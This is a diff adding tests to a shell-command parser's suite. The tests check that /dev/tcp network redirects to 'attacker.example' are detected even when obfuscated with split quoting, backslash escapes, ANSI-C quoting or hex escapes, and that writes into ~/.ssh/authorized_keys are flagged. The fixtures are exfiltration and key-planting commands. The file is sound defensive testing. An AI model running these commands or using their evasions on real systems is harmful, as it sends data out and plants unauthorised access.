@@ -298,6 +298,41 @@ describe("Shell Parser", () => {
         const result = await parse("echo noise > /dev/null");
         expect(hasNetworkRedirect(result)).toBe(false);
       });
+
+      test("normalizes concatenated quoting in the target", async () => {
+        for (const command of [
+          'echo secret > /dev/t"cp"/attacker.example/80',
+          "echo secret > /dev/'tcp'/attacker.example/80",
+          'echo secret > "/dev/tcp"/attacker.example/80',
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(true);
+        }
+      });
+
+      test("normalizes backslash escapes and ANSI-C quoting in the target", async () => {
+        for (const command of [
+          "echo secret > /dev/\\tcp/attacker.example/80",
+          "echo secret > $'/dev/tcp/attacker.example/80'",
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(true);
+        }
+      });
+
+      test("decodes ANSI-C escapes in the target", async () => {
+        const result = await parse(
+          "echo secret > $'/dev/\\x74cp/attacker.example/80'",
+        );
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("keeps backslashes literal inside quotes", async () => {
+        for (const command of [
+          "echo x > '/dev/\\tcp/host/80'",
+          'echo x > "/dev/\\tcp/host/80"',
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(false);
+        }
+      });
     });
 
     // sensitive_redirect
@@ -328,6 +363,20 @@ describe("Shell Parser", () => {
         expect(
           result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
         ).toBe(true);
+      });
+
+      test("normalizes concatenated quoting in the target", async () => {
+        const result = await parse('echo key > ~/.s"sh"/authorized_keys');
+        expect(
+          result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
+        ).toBe(true);
+      });
+
+      test("treats a quoted tilde as a literal directory", async () => {
+        const result = await parse("echo key > '~/.ssh/authorized_keys'");
+        expect(
+          result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
+        ).toBe(false);
       });
 
       test("detects redirect to ~/.gnupg/", async () => {
@@ -786,5 +835,24 @@ describe("Shell Parser", () => {
       expect(programs).toContain("grep");
       expect(result.segments.every((s) => !s.synthetic)).toBe(true);
     });
+  });
+});
+
+describe("redirect targets with expansions are opaque", () => {
+  for (const command of [
+    "X=/dev/tcp; echo secret > $X/attacker.example/80",
+    'echo secret > "${OUT}"',
+    "echo secret > $(printf /dev/tcp/attacker.example/80)",
+    "cat < $INPUT",
+  ]) {
+    test(command, async () => {
+      expect((await parse(command)).hasOpaqueConstructs).toBe(true);
+    });
+  }
+
+  test("a literal target is not opaque", async () => {
+    expect((await parse("echo noise > /dev/null")).hasOpaqueConstructs).toBe(
+      false,
+    );
   });
 });
